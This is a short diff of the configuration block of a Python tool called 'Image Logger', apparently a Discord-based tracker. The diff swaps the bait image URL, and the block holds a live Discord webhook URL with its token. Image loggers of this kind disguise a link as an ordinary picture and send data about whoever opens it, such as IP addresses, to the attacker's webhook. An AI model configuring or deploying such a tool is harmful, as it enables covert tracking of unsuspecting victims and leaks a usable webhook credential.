@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1374739124455608512/6gYxfzx_OoKcMtRrZo98qwVbSKSvYoWlc4wteyLA_fU8_x1EPhiiPUsk4KGrkXf_pZHD",
-    "image": "https://tenor.com/view/rat-dance-gif-4982762588848687194",                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "image": "https://cdn.discordapp.com/attachments/1374172246221787217/1374182502339448903/IMG_0903.png?ex=682f18ef&is=682dc76f&hm=b72a52f797f770438af25f98c616357d97e38f8ee3047ec3b0c7bac01e69082f&",                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
